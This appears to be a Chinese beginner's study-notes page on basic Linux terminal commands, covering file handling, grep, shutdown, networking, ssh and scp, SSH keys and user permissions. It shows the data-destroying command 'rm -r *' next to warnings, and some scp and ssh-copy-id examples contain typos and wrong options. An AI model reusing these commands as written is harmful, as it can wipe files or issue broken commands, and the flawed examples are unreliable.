<h2 id="01-终端命令格式"><a href="#01-终端命令格式" class="headerlink" title="01. 终端命令格式"></a>01. 终端命令格式</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">command</span> [-options] [parameter]</span><br></pre></td></tr></table></figure>

<p>说明：</p>
<ul>
<li><code>command</code>：命令名，相应功能的英文单词或单词的缩写</li>
<li><code>[-options]</code>：选项，可用来对命令进行控制，也可以省略</li>
<li><code>parameter</code>：传给命令的参数，可以是 <strong>零个</strong>、<strong>一个</strong> 或者 <strong>多个</strong></li>
</ul>
<blockquote>
<p><code>[]</code> 代表可选 </p>
</blockquote>
<h2 id="02-查阅命令帮助信息（知道）"><a href="#02-查阅命令帮助信息（知道）" class="headerlink" title="02. 查阅命令帮助信息（知道）"></a>02. 查阅命令帮助信息（知道）</h2><blockquote>
<p>提示</p>
<ul>
<li>现阶段只需要 <strong>知道</strong> 通过以下两种方式可以查询命令的帮助信息</li>
<li>先学习<strong>常用命令</strong>及<strong>常用选项</strong>的使用即可，工作中如果遇到问题可以借助 <strong>网络搜索</strong></li>
</ul>
</blockquote>
<h3 id="2-1-help"><a href="#2-1-help" class="headerlink" title="2.1 --help"></a>2.1 <code>--help</code></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">command</span> --<span class="built_in">help</span></span><br></pre></td></tr></table></figure>

<p>说明：</p>
<ul>
<li>显示 <code>command</code> 命令的帮助信息</li>
</ul>
<h3 id="2-2-man"><a href="#2-2-man" class="headerlink" title="2.2 man"></a>2.2 man</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">man <span class="built_in">command</span></span><br></pre></td></tr></table></figure>

<p>说明：</p>
<ul>
<li>查阅 <code>command</code> 命令的使用手册</li>
</ul>
<blockquote>
<p><code>man</code> 是 <strong>manual</strong> 的缩写，是 Linux 提供的一个 <strong>手册</strong>，包含了绝大部分的命令、函数的详细使用说明</p>
</blockquote>
<p>使用 <code>man</code> 时的操作键：</p>
<table>
<thead>
<tr>
<th align="left">操作键</th>
<th align="left">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="left">空格键</td>
<td align="left">显示手册页的下一屏</td>
</tr>
<tr>
<td align="left">Enter 键</td>
<td align="left">一次滚动手册页的一行</td>
</tr>
<tr>
<td align="left">b</td>
<td align="left">回滚一屏</td>
</tr>
<tr>
<td align="left">f</td>
<td align="left">前滚一屏</td>
</tr>
<tr>
<td align="left">q</td>
<td align="left">退出</td>
</tr>
<tr>
<td align="left">/word</td>
<td align="left">搜索 <strong>word</strong> 字符串</td>
</tr>
</tbody></table>
<h3 id="3-1-touch"><a href="#3-1-touch" class="headerlink" title="3.1 touch"></a>3.1 touch</h3><p><strong>命令 如果文件不存在，可以创建一个文件</strong></p>
<p><strong>如果文件已经存在 可以修改文件的末次日期。</strong></p>
<h3 id="3-2mkdir"><a href="#3-2mkdir" class="headerlink" title="3.2mkdir"></a>3.2mkdir</h3><p> 创建一个新的目录</p>
<table>
<thead>
<tr>
<th>选项</th>
<th align="left">含义</th>
</tr>
</thead>
<tbody><tr>
<td><strong>-p</strong></td>
<td align="left"><strong>可以递归创建目录        意思可以在目录中连续创建多个目录</strong></td>
</tr>
</tbody></table>
<p><strong>新建目录名称和文件是不可以重名的。</strong>    <strong><em>如果使用同名文件夹会报错显示已存在文件。</em></strong></p>
<p><strong>~/目录    可以进入想要进入的家目录。</strong></p>
<h3 id="3-4-rm"><a href="#3-4-rm" class="headerlink" title="3.4 rm"></a>3.4 rm</h3><p><strong>rm 只能删除文件 ，   rm后加-r可以删除文件或者目录。</strong> </p>
<h5 id="rm删除文件或者目录后是不可以恢复的，因为rm命令是直接从磁盘中删除。所以使用rm命令时需要谨慎使用避免删错。-使用rm时看好在那个目录下，防止删除系统内容，导致系统瘫痪。"><a href="#rm删除文件或者目录后是不可以恢复的，因为rm命令是直接从磁盘中删除。所以使用rm命令时需要谨慎使用避免删错。-使用rm时看好在那个目录下，防止删除系统内容，导致系统瘫痪。" class="headerlink" title="*rm删除文件或者目录后是不可以恢复的，因为rm命令是直接从磁盘中删除。所以使用rm命令时需要谨慎使用避免删错。 *    使用rm时看好在那个目录下，防止删除系统内容，导致系统瘫痪。"></a>*<em>rm删除文件或者目录后是不可以恢复的，因为rm命令是直接从磁盘中删除。所以使用rm命令时需要谨慎使用避免删错。 *</em>    使用rm时看好在那个目录下，防止删除系统内容，导致系统瘫痪。</h5><table>
<thead>
<tr>
<th>选项</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><strong>-f</strong></td>
<td><strong>强制删除文件，如果文件不存在是不提示错误的。 **  **-f只能删除文件，是不可以强制删除目录的</strong></td>
</tr>
<tr>
<td><strong>-r</strong></td>
<td><strong>可以删除目录中所有内容，删除目录时必须加-r</strong></td>
</tr>
</tbody></table>
<p><strong>通配符也可以在rm中使用，rm -r  *     可以清除所有文件和目录。</strong></p>
<h3 id="0-4-拷贝和移动文件"><a href="#0-4-拷贝和移动文件" class="headerlink" title="0.4 拷贝和移动文件"></a>0.4 拷贝和移动文件</h3><h4 id="4-1tree"><a href="#4-1tree" class="headerlink" title="4.1tree"></a><strong>4.1tree</strong></h4><table>
<thead>
<tr>
<th>序号</th>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td><strong>01</strong></td>
<td><strong>tree[目录名]</strong></td>
<td><strong>tree命令是以树状图列出目录结构</strong></td>
</tr>
<tr>
<td><strong>02</strong></td>
<td><strong>cp  源文件    目标文件</strong></td>
<td><strong>复制文件或者目录</strong></td>
</tr>
<tr>
<td><strong>03</strong></td>
<td><strong>mv  源文件  目标文件</strong></td>
<td><strong>移动文件或者目录/文件或者目录重名</strong></td>
</tr>
</tbody></table>
<p><strong>tree 加~ 可以显示家目录下所有文件和目录。</strong></p>
<p><strong>tree 加-d 只显示目录。</strong></p>
<p>directories  表示目录     files 表示文件</p>
<h4 id="4-2-cp"><a href="#4-2-cp" class="headerlink" title="4.2 cp"></a>4.2 cp</h4><table>
<thead>
<tr>
<th>选项</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><strong>-i</strong></td>
<td><strong>覆盖文件时候提示是否覆盖</strong></td>
</tr>
<tr>
<td>-r</td>
<td>复制文件时在cp后面加-r    复制完成的文件会把源文件下所有子目录和文件复制过去  ，但目标文件需要重命名。</td>
</tr>
</tbody></table>
<h4 id="4-3-mv"><a href="#4-3-mv" class="headerlink" title="4.3 mv"></a><strong>4.3 mv</strong></h4><p><strong>mv</strong>命令可以用来<strong>移动文件或者目录</strong>，也可以给文件或者<strong>目录重命名</strong>。</p>
<p><strong>mv</strong>命令后加<strong>-i</strong> 可以<strong>提示是否覆盖文件或者目录</strong>以防发生覆盖错误。</p>
<p><strong>使用mv命令时如果加入-i 出现存在文件会提示我们是否覆盖，这样在使用的时候会更加安全。因为文件或目录覆盖和删除后时没办法恢复的。</strong></p>
<h3 id="05-查看文件内容、"><a href="#05-查看文件内容、" class="headerlink" title="05 查看文件内容、"></a>05 查看文件内容、</h3><table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>cat  文件名</td>
<td>查看文件内容、创建文件、文件合并、追加文件内容等功能</td>
</tr>
<tr>
<td>more  文件名</td>
<td>分屏显示文件内容</td>
</tr>
<tr>
<td>grep  搜索内容<br>文件名</td>
<td>搜索文本文件内容</td>
</tr>
</tbody></table>
<h4 id="5-1-cat"><a href="#5-1-cat" class="headerlink" title="5.1 cat"></a>5.1 cat</h4><p><strong>cat 查看文件内容、创建文件、文件合并、追加文件内容等功能</strong></p>
<p><strong>cat  会一次显示所有的内容，适合 查看内容较少的文本文件</strong></p>
<table>
<thead>
<tr>
<th>选项</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><strong>-b</strong></td>
<td><strong>对非空输出行编号</strong>     将空开的行不给予行号</td>
</tr>
<tr>
<td><strong>-n</strong></td>
<td><strong>对输出的所有行编号</strong>      将所有行都给予行号</td>
</tr>
</tbody></table>
<p><strong>Linux 中还有一个nl的命令和cat  -b  的效果等价</strong></p>
<h4 id="5-2-more"><a href="#5-2-more" class="headerlink" title="5.2 more"></a>5.2 more</h4><p><strong>more命令可以用于分屏显示文件内容，每次只显示一页内容</strong></p>
<p><strong>适合查看内容较多的文本文件</strong></p>
<table>
<thead>
<tr>
<th><strong>操作键</strong></th>
<th><strong>功能</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>空格键</strong></td>
<td><strong>显示手册页的下一屏</strong></td>
</tr>
<tr>
<td><strong>回车键</strong></td>
<td><strong>一次滚动手册页的一行</strong></td>
</tr>
<tr>
<td><strong>b</strong></td>
<td><strong>回滚一屏</strong></td>
</tr>
<tr>
<td><strong>f</strong></td>
<td><strong>前滚一屏</strong></td>
</tr>
<tr>
<td><strong>q</strong></td>
<td><strong>退出</strong></td>
</tr>
<tr>
<td><strong>/word</strong></td>
<td><strong>搜索  word字符串</strong></td>
</tr>
</tbody></table>
<p>空格键和F键功能是一样的。</p>
<h4 id="5-3-grep"><a href="#5-3-grep" class="headerlink" title="5.3 grep"></a>5.3 grep</h4><p><strong>Linux 系统中 grep 命令是一种强大的文本搜索工具</strong></p>
<p><strong>grep  允许对文本文件进行 模式查找，所谓模式查找，又被称为正则表达式，</strong></p>
<table>
<thead>
<tr>
<th>选项</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><strong>-n</strong></td>
<td><strong>显示匹配行及行号         既显示内容又显示行号</strong></td>
</tr>
<tr>
<td><strong>-v</strong></td>
<td><strong>显示不包含匹配文本的所有行（相当于取反搜索）         省略你想要搜索的内容</strong></td>
</tr>
<tr>
<td>-i</td>
<td><strong>忽略大小写</strong></td>
</tr>
</tbody></table>
<p><strong>grep 可以查找文本中你想要找到的内容</strong></p>
<p><u><strong>grep  -vn   将-n和-v 合并 显示行号但不显示你所查找的内容</strong></u></p>
<p><strong>grep  -i 的时候 如果搜索内容中间有空格需要用引号将你所要搜索的内容引起来。</strong></p>
<p>常用的两种模式查找</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><strong>^a</strong></td>
<td><strong>行首，搜索以a开头的行</strong></td>
</tr>
<tr>
<td><strong>ke$</strong></td>
<td><strong>行尾，搜索以ke结束的行</strong></td>
</tr>
</tbody></table>
<p><strong>^(你所要找的行首内容)</strong></p>
<p><strong>(你所要找的行尾内容)$</strong></p>
<h3 id="0-6其他"><a href="#0-6其他" class="headerlink" title="0.6其他"></a>0.6其他</h3><h4 id="6-1-echo-文字内容"><a href="#6-1-echo-文字内容" class="headerlink" title="6.1  echo 文字内容"></a>6.1  echo 文字内容</h4><p>echo 会在终端中显示参数指定的文字，通常会和  <strong>重定向</strong>  联合使用</p>
<p>ceho  是将你想要显示指定文字在显示一边         <strong>echo 很少会单独使用</strong></p>
<h4 id="6-2重定向-gt-和-gt-gt"><a href="#6-2重定向-gt-和-gt-gt" class="headerlink" title="6.2重定向  &gt; 和  &gt;&gt;"></a>6.2重定向  &gt; 和  &gt;&gt;</h4><p>Linux 允许将命令执行结果 <strong>重定向</strong>  到一个<strong>文件</strong></p>
<p>将本应显示在<strong>终端上的内容输出  /   追加到指定文件中</strong></p>
<p>·       &gt; 表示输出，会覆盖你源文件的全部内容。</p>
<p>·       &gt;&gt;表示追加，会将内容追加到已有文件的末尾.</p>
<p>使用  &gt;  时 要谨慎使用，防止将重要文件覆盖。</p>
<p>在你想要使用  &gt;     &gt;&gt;     等命令后面加上文件名</p>
<h4 id="6-3-管道"><a href="#6-3-管道" class="headerlink" title="6.3 管道|"></a>6.3 管道|</h4><p>Linux 允许将  <strong>一个命令的输出</strong>  可以 <strong>通过管道</strong>  做为  <strong>另一个命令的输入</strong></p>
<p>这里|可以理解为管子，<strong>左端塞东西（写），右端去东西（读）</strong></p>
<p>常用管道命令：</p>
<p><strong>more：</strong>分屏显示内容</p>
<p><strong>grep：</strong>在命令执行结果的基础上查询指定的文本。 </p>
<h2 id="远程管理常用命令"><a href="#远程管理常用命令" class="headerlink" title="远程管理常用命令"></a>远程管理常用命令</h2><h4 id="目标-2"><a href="#目标-2" class="headerlink" title="目标"></a>目标</h4><ul>
<li><strong>关机/重启</strong><ul>
<li>shutdown</li>
</ul>
</li>
<li><strong>查看或配置网卡信息</strong><ul>
<li>ifconfig</li>
<li>ping</li>
</ul>
</li>
<li><strong>远程登陆和复制文件</strong><ul>
<li>ssh</li>
<li>scp</li>
</ul>
</li>
</ul>
<h4 id="01-关机-重启"><a href="#01-关机-重启" class="headerlink" title="01.关机/重启"></a>01.关机/重启</h4><table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>shutdown   选项   时间</td>
<td>关机/重新启动</td>
</tr>
</tbody></table>
<p>想要重新启动电脑或者关闭电脑可以在终端中先输入<strong>shutdown</strong>  在指令选项<strong>（关机/重启）</strong>并接上一个关机<strong>/重新启动的时间</strong></p>
<p>如果向立即关闭 电脑  只需要在   <strong>shutdown 关机/重启电脑  now</strong>       只需要在时间那里输入一个<strong>now。</strong></p>
<p>如果  <strong>不指令任何选项</strong>，默认的将会是<strong>关机</strong>，</p>
<table>
<thead>
<tr>
<th>选项</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>-r</td>
<td>重新启动</td>
</tr>
</tbody></table>
<p>如果想要<strong>重启电脑</strong>，只需要<strong>加入一个 -r</strong> 的指令。</p>
<p><strong>提示：</strong></p>
<ul>
<li><p>如果不指定时间参数，系统默认一分钟之后关闭电脑                          如果后悔   在shutdown  后面加-c  表示取消关机    而这个操作需要在一分钟之内完成，也就是关机之前完成操作。</p>
</li>
<li><p><strong>远程维护服务器时，最好不好关闭系统，而应该重新启动系统</strong>          我们在输入  <strong>shutdown</strong>  指令时千万不要忘记输入 <strong>-r 指令</strong>     如果<strong>忘记输入-r</strong>  立刻加 <strong>-c 取消关机</strong></p>
</li>
<li><p>常用命令示例</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  重新启动操作系统，其中 now 表示现在立即</span><br><span class="line">$  shutdown -r now</span><br><span class="line"></span><br><span class="line">#  立即关机，其中 now 表示现在</span><br><span class="line">$  shutdown now</span><br><span class="line"></span><br><span class="line">#  系统在今天的20：25会关机</span><br><span class="line">$  shutdown 20:25</span><br><span class="line"></span><br><span class="line">#  系统在过十分钟自动关机</span><br><span class="line">$  shutdown +10</span><br><span class="line"></span><br><span class="line">#  取消之前指定的关机计划</span><br><span class="line">$  shutdown -c</span><br></pre></td></tr></table></figure>

<h4 id="02-查看或配置网卡信息"><a href="#02-查看或配置网卡信息" class="headerlink" title="02.查看或配置网卡信息"></a>02.查看或配置网卡信息</h4><table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>ifconfig</td>
<td>查看/配置计算机当前的网卡配置信息</td>
</tr>
<tr>
<td>ping ip地址</td>
<td>检测到目标 ip地址的链接是否正常</td>
</tr>
</tbody></table>
<h5 id="2-1-网卡和IP地址"><a href="#2-1-网卡和IP地址" class="headerlink" title="2.1 网卡和IP地址"></a>2.1 网卡和IP地址</h5><p><strong>网卡</strong></p>
<ul>
<li>网卡是一个专门负责网络通讯的硬件设备</li>
<li>IP地址是设置在网卡上的地址信息</li>
</ul>
<blockquote>
<p>我们可以把电脑比作电话，网卡相当于SIM卡，ip地址相当于电话号码</p>
</blockquote>
<h5 id="ip地址"><a href="#ip地址" class="headerlink" title="ip地址"></a>ip地址</h5><ul>
<li>每台联网的电脑上都有ip地址，是帮正电脑之间正常通讯的重要设置</li>
</ul>
<blockquote>
<p>注意：每台电脑的ip地址不能相同，否则会出现ip冲突，并且没有办法正常通讯。</p>
</blockquote>
<h5 id="2-2-ifconfig"><a href="#2-2-ifconfig" class="headerlink" title="2.2  ifconfig"></a>2.2  ifconfig</h5><p>ifconfig 可以查看/配置计算机当前的网卡配置信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 查看网卡配置信息</span><br><span class="line">$ ifconfig</span><br><span class="line"></span><br><span class="line"># 查看网卡对应的Ip地址</span><br><span class="line">$ ifconfig | grep inet</span><br></pre></td></tr></table></figure>

<p><strong>inet  地址 是IP地址</strong>，如果内容太多<strong>只想显示ip地址</strong>命令，可以<strong>利用管道命令</strong>来显示。</p>
<blockquote>
<p>提示：一台计算机中有可能会有一个 <strong>物理网卡</strong>  和  <strong>多个虚拟网卡</strong>， 在Linux 中物理网卡的名字通常以   <strong>ensXX</strong>  表示</p>
</blockquote>
<ul>
<li><strong>127.0.0.1</strong>  被称为 <strong>本地回环/环回地址</strong>，一般用来测试本机网卡是否正常</li>
</ul>
<h4 id="2-3-ping"><a href="#2-3-ping" class="headerlink" title="2.3 ping"></a>2.3 ping</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  检测到目标主机是否连接正常</span><br><span class="line">$  ping  IP地址</span><br><span class="line"></span><br><span class="line">#  检测本地网卡工作正常</span><br><span class="line">$  ping 127.0.0.1</span><br></pre></td></tr></table></figure>

<ul>
<li>ping   一般用于检测当前计算机到目标计算机之间的网络  <strong>是否通畅</strong>，  <strong>数值越大</strong> ， <strong>速度越慢</strong>  。</li>
</ul>
<p>要使用 <strong>ping命令</strong>，必须要知道<strong>目标主机的 IP地址</strong></p>
<p>意思是，目标主机无法到达。也就是说 当前ip地址和我们计算机并没有网络连接。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1574847706399.png" alt="1574841281576"></p>
<p>如果使用  <strong>ping  127.0.0.1</strong>  有回馈就说明我们本地网卡是通的。</p>
<h4 id="3-1-ssh-基础-（重点内容）"><a href="#3-1-ssh-基础-（重点内容）" class="headerlink" title="3.1  ssh 基础 （重点内容）"></a>3.1  ssh 基础 （重点内容）</h4><p>在Linux 中 SSH 是<strong>非常常用</strong> 的工具，通过 <strong>SSH客户端</strong> 我们可以连接到运行了<strong>SSH服务器</strong> 的<strong>远程机器上</strong></p>
<p>SSH是个<strong>软件</strong>不管是客户端还是服务器</p>
<p><strong>工作方式：</strong>当两个软件安装到位之后，我们就可以在自己的电脑上通过网络远程登录到服务器上，对服务器进行日常管理和维护。     在Ubuntu中SSH是默认安装的   只有在windows系统下需要专门安装客户端进行远程维护。<img src="https://gitee.com/zhanqiaozai/picture/raw/master/1574841281576.png" alt="1574847706399"></p>
<ul>
<li><p>SSH是目前较可靠， <strong>专为远程登录会话和其他网络服务</strong> 提供安全性的协议</p>
<ul>
<li>利用SSH协议  可以<strong>有效防止远程管理过程中的信息泄露</strong></li>
<li>通过SSH协议  可以对所有传输的数据进行加密，也能够防止DNS欺骗和 IP 欺骗</li>
</ul>
</li>
<li><p>SSH 的另一项优点是传输的数据可以是经过压缩的，所以也可以加快传输的速度</p>
</li>
</ul>
<h4 id="1）域名-和-端口号"><a href="#1）域名-和-端口号" class="headerlink" title="1）域名  和  端口号"></a>1）域名  和  端口号</h4><p><strong>域名</strong></p>
<ul>
<li>由一串 用点分隔 的名字组成，例如：<a href="http://www.itcast.cn" target="_blank" rel="noopener">www.itcast.cn</a></li>
<li>是IP地址的别名，方便用户记忆</li>
</ul>
<p><strong>端口号</strong></p>
<ul>
<li><p><strong>IP地址</strong>：通过 <strong>IP地址</strong> 找到网络上的 计算机</p>
</li>
<li><p><strong>端口号</strong>：通过  <strong>端口号</strong> 可以找到 <strong>计算机上运行的应用程序</strong>            <strong>ip</strong>  地址：<strong>端口号</strong>         这两个命令一个不能少    <strong>每个服务器都有默认的端口</strong>，如果我们在<strong>访问服务器的时候没有指定端口</strong>，那它用的则是<strong>默认端口</strong>。</p>
<ul>
<li><strong>SSH服务器</strong>的默认端口是22，如果是默认端口号，再连接的时候，可以省略</li>
</ul>
</li>
<li><p>常见的服务器端口号列表：</p>
</li>
</ul>
<table>
<thead>
<tr>
<th>服务</th>
<th>端口号</th>
</tr>
</thead>
<tbody><tr>
<td>SSH服务器</td>
<td>22</td>
</tr>
<tr>
<td>Web服务器</td>
<td>80</td>
</tr>
<tr>
<td>HTTPS</td>
<td>443</td>
</tr>
<tr>
<td>FTP服务器</td>
<td>21</td>
</tr>
</tbody></table>
<h4 id="2）SSH-客户端的简单使用"><a href="#2）SSH-客户端的简单使用" class="headerlink" title="2）SSH 客户端的简单使用"></a>2）SSH 客户端的简单使用</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh [-p port] user@remote</span><br><span class="line">如果 你所用的port 就是默认端口号 前面的-p可以省略，如果不是则需要加上-p  跟上指定端口号。</span><br></pre></td></tr></table></figure>

<ul>
<li>user  是在远程机器上的用户名，如果不指定的话默认为当前用户</li>
<li>remote 是远程机器的地址，可以是 <strong>ip/域名</strong>，或者是  <strong>别名</strong></li>
<li>port <strong>是SSH Server 监听的端口</strong>，如果不指定，就为默认值22</li>
</ul>
<blockquote>
<p>提示：</p>
<ul>
<li><p>使用exit 退出当前用户的登录</p>
<p>注意：</p>
</li>
</ul>
</blockquote>
<ul>
<li>ssh  这个终端命令 只能在linux   或者  unix  系统下使用</li>
<li>如果在Windows系统中，可以安装PuTTY或者 XShell 客户端软件即可</li>
</ul>
<p>提示：</p>
<p>在工作中，SSH服务器的端口号很有可能 不是22，如果遇到这种情况就需要使用 -p 选项，指定正确的端口号，否侧无法正常连接到服务器。</p>
<h4 id="3）Windows下SSH客户端的安装"><a href="#3）Windows下SSH客户端的安装" class="headerlink" title="3）Windows下SSH客户端的安装"></a>3）Windows下SSH客户端的安装</h4><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1574854673783.png" alt="1574854673783"></p>
<h4 id="3-2-scp-（掌握）"><a href="#3-2-scp-（掌握）" class="headerlink" title="3.2  scp （掌握）"></a>3.2  scp （掌握）</h4><ul>
<li>scp是一个在Linux下用来进行  <strong>远程拷贝文件</strong> 的命令</li>
<li>它的 <strong>地址格式与 ssh 基本相同</strong> ，<strong>需要注意的是</strong>，在<strong>指定端口时</strong>用的是<strong>大写的 -P</strong>而不是小写的。</li>
</ul>
<p><strong>可以将我们的文件拷贝到服务器里，也可以将服务器里的文件拷贝到我们的客户端</strong><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1574923969548.png" alt="1574855460765"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 把本地当前目录下的11245.txt文件 复制到 远程 家目录下的 文档&#x2F;11245.txt</span><br><span class="line"># 注意：“：”后面的路径如果不是绝对路径，则以用户的家目录做为参照路径</span><br><span class="line">scp -P port 1124.txt user@remote：桌面&#x2F;11245.txt</span><br><span class="line"></span><br><span class="line">#把远程 家目录下的 桌面&#x2F;1124.txt 文件 复制到  本地当前目录下的 11245.txt</span><br><span class="line">scp -P pore user@remote:桌面&#x2F;11245.txt 11245.txt</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>选项</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>-r</td>
<td>如给出的源文件是目录文件，则scp将递归复制该目录下的所有子目录和文件，目标文件必须为一个目录名</td>
</tr>
<tr>
<td>-p</td>
<td>若远程SSH服务器的端口不是22，需要使用大写字母-P选项指定端口</td>
</tr>
</tbody></table>
<h4 id="SSH-高级-（知道）"><a href="#SSH-高级-（知道）" class="headerlink" title="SSH  高级 （知道）"></a>SSH  高级 （知道）</h4><p>SSH配置信息都保存在用户家目录下的 <strong>.ssh</strong> 目录下</p>
<p><strong>免密码登录</strong>      <strong>scp -p 22  用户名/ip</strong>     <strong>cat known_hosts(记录第一次连接主机的授权码)</strong>ls</p>
<p><strong>配置公钥</strong></p>
<p><strong>执行 ssh-keygen即可生成SSH钥匙，一路回车即可</strong></p>
<p><strong>上传公钥到服务器</strong></p>
<p><strong>执行 ssh-copy-id -p 用户名@ip ，可以让远程服务器记住我们的公钥</strong></p>
<p><strong>公钥和私钥</strong></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1574855460765.png" alt="1574923969548"></p>
<p>进行免密码登录<strong>首先执行ssh-keygen</strong>这个命令，这个命令可以生成两个文件，一个<strong>带点的一个 id_rsa.pub</strong></p>
<p>一个<strong>不带点的id_rsa</strong>     而<strong>带点的文件我们称他为公钥</strong>，而<strong>不带点的文件我们称他为私钥</strong>。</p>
<p>所谓公钥就是公共加密的钥匙，而私钥就是私用加密的钥匙</p>
<p>使用公钥加密的钥匙，我们必须要用私钥进行解密，而反过来呢，使用私钥加密的钥匙，我们必须要用公钥解密</p>
<h4 id="2-配置别名"><a href="#2-配置别名" class="headerlink" title="2)配置别名"></a>2)配置别名</h4><p>每次输入 ssh -p port user@remote, 时间久了会觉得很麻烦，特别是当 ueer 和port都得输入，还不好记忆。</p>
<p>而<strong>配置别名</strong>可以让我们进一步偷懒，譬如 <strong>ssh mac</strong>  来代替上面这么一长串，那么就</p>
<p>在<strong>~/.ssh/config</strong>  里面追加以下内容：</p>
<p><strong>Host mac HostName ip 地址</strong></p>
<p><strong>User itheima</strong> </p>
<p><strong>port 22</strong></p>
<p><strong>保存之后即可用  ssh mac 实现远程登录了，scp同样可以使用</strong></p>
<h4 id="用户和权限的基本概念"><a href="#用户和权限的基本概念" class="headerlink" title="用户和权限的基本概念"></a>用户和权限的基本概念</h4><h6 id="1-1-基本概念"><a href="#1-1-基本概念" class="headerlink" title="1.1 基本概念"></a>1.1 基本概念</h6><p>用户是Linux 系统工作中重要的一环，用户管理包括 <strong>用户</strong> 与 <strong>组</strong> 管理</p>
<p>在Linux系统中，不论是由本机或是远程登陆系统，每个系统都必须拥有一个账号并且<strong>对于不同的系统资源拥有不同的使用权限</strong></p>
<p>在Linux中，可以指定 <strong>每一个用户</strong> 针对 <strong>不用的文件或者目录</strong> 的 <strong>不同权限</strong></p>
<p>对 文件/目录 的而权限包括：</p>
<table>
<thead>
<tr>
<th>权限</th>
<th>英文</th>
<th>缩写</th>
<th>数字代号</th>
</tr>
</thead>
<tbody><tr>
<td>读</td>
<td>read</td>
<td>r</td>
<td>4</td>
</tr>
<tr>
<td>写</td>
<td>write</td>
<td>w</td>
<td>2</td>
</tr>
<tr>
<td>执行</td>
<td>excute</td>
<td>x</td>
<td>1</td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1574938261680.png" alt="1574938261680"></p>
<h4 id="1-3-ls-l扩展"><a href="#1-3-ls-l扩展" class="headerlink" title="1.3  ls -l扩展"></a>1.3  ls -l扩展<img src="https://gitee.com/zhanqiaozai/picture/raw/master/1574939435311.png" alt="1574938317879"></h4><p><strong>r</strong>    <strong>表示可读</strong>的意思     <strong>w</strong>  <strong>表示可写</strong>的意思     <strong>x</strong>     <strong>表示可执行</strong>的意思     <img src="https://gitee.com/zhanqiaozai/picture/raw/master/1574938317879.png" alt="1574938449496"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1575000296459.png" alt="1574939435311"></p>
<h4 id="1-4-chmod-简单使用（重要）"><a href="#1-4-chmod-简单使用（重要）" class="headerlink" title="1.4  chmod 简单使用（重要）"></a>1.4  chmod 简单使用（重要）</h4><p>chmod 可以修改 <strong>用户/组</strong> 对 <strong>文件/目录</strong> 的权限</p>
<p>命令格式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod +&#x2F;-rwx 文件名|目录名</span><br></pre></td></tr></table></figure>

<p>gedit  打开文件  可以进行编写。</p>
<h4 id="1-5-超级用户"><a href="#1-5-超级用户" class="headerlink" title="1.5 超级用户"></a>1.5 超级用户</h4><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1574946317982.png" alt="1574946317982"></p>
<h4 id="0-2-组管理终端命令"><a href="#0-2-组管理终端命令" class="headerlink" title="0.2 组管理终端命令"></a>0.2 组管理终端命令</h4><p>创建 <strong>组/删除组</strong> 的终端命令都需要  <strong>sudo</strong> 执行    </p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1574938449496.png" alt="1575000296459"></p>
<p><strong>ch表示修改 grp 表示组  -R  文件  目录名</strong></p>
<p>提示：</p>
<p>组信息保<strong>存在/etc/group 文件中</strong></p>
<p><strong>/etc 目录是专门用来保存 系统配置信息</strong> 的目录</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1575000932771.png" alt="1575000932771"></p>
<h4 id="0-3-创建用户-设置密码-删除用户"><a href="#0-3-创建用户-设置密码-删除用户" class="headerlink" title="0.3 创建用户/设置密码/删除用户"></a>0.3 创建用户/设置密码/删除用户</h4><p>add 表示添加的意思 </p>
<table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>useradd -m -g 组名 新建用户名</td>
<td>添加新用户</td>
<td>-m 自动建立用户家目录<br>-g用户所在的组</td>
</tr>
<tr>
<td>passwd 用户名</td>
<td>设置用户密码</td>
<td>如果是普通用户，直接用passwd<br>可以修改自己的账户密码</td>
</tr>
<tr>
<td>userdel -r 用户名</td>
<td>删除用户</td>
<td>-r 选项会自动删除用户家目录</td>
</tr>
<tr>
<td>cat /etc/passwd | grep 用户名</td>
<td>确认用户信息</td>
<td>新建用户后，用户信息会保存在/etc/passwd文件中</td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1575079659167.png" alt="1575078286479"></p>
<h4 id="3-2-查看用户信息"><a href="#3-2-查看用户信息" class="headerlink" title="3.2 查看用户信息"></a>3.2 查看用户信息</h4><table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>id [用户名]</td>
<td>查看用户UID和GID信息</td>
</tr>
<tr>
<td>who</td>
